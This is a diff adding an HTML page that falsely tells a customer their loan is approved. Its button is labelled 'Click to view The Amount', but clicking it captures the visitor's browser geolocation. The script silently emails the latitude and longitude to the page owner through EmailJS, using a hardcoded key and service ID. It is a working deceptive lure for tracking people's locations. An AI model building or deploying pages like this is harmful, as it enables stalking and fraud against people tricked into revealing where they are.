@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loan Approval & Location Capture</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f4f6f8;
+      color: #333;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 30px;
+    }
+
+    .approved-message {
+      border-left: 6px solid #28a745;
+      padding-left: 15px;
+      margin-bottom: 30px;
+    }
+
+    .approved-message h2 {
+      color: #28a745;
+      margin-top: 0;
+    }
+
+    .location-section h3 {
+      margin-top: 0;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    #output {
+      margin-top: 15px;
+      font-size: 15px;
+      white-space: pre-line;
+      color: #555;
+    }
+  </style>
+
+  <script>
+    (function() {
+      emailjs.init("Dd_Zg0P4XzVNKOqpB"); // Replace with your EmailJS Public Key
+    })();
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        document.getElementById("output").innerText = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      document.getElementById("output").innerText =
+        "Latitude: " + lat + "\nLongitude: " + lon;
+
+      emailjs.send("service_td9eltg", "YOUR_TEMPLATE_ID", {
+        latitude: lat,
+        longitude: lon
+      }).then(function(response) {
+        console.log("Location sent via email successfully!");
+      }, function(error) {
+        alert("Failed to send email: " + error.text);
+      });
+    }
+
+    function showError(error) {
+      document.getElementById("output").innerText =
+        "Error getting location: " + error.message;
+    }
+  </script>
+</head>
+<body>
+
+  <div class="container">
+    <div class="approved-message">
+      <h2>🎉 Loan Application Approved</h2>
+      <p>Dear Customer,</p>
+      <p>We are pleased to inform you that your loan application has been <strong>approved</strong>. Our team will contact you shortly with further instructions and disbursement details.</p>
+      <p>Thank you for choosing our services.</p>
+    </div>
+
+    <div class="location-section">
+      <h3>📍 Share Your Location</h3>
+      <p>To proceed, please confirm your current location:</p>
+      <button onclick="getLocation()">Click to view The Amount</button>
+      <p id="output"></p>
+    </div>
+  </div>
+
+</body>
+</html>
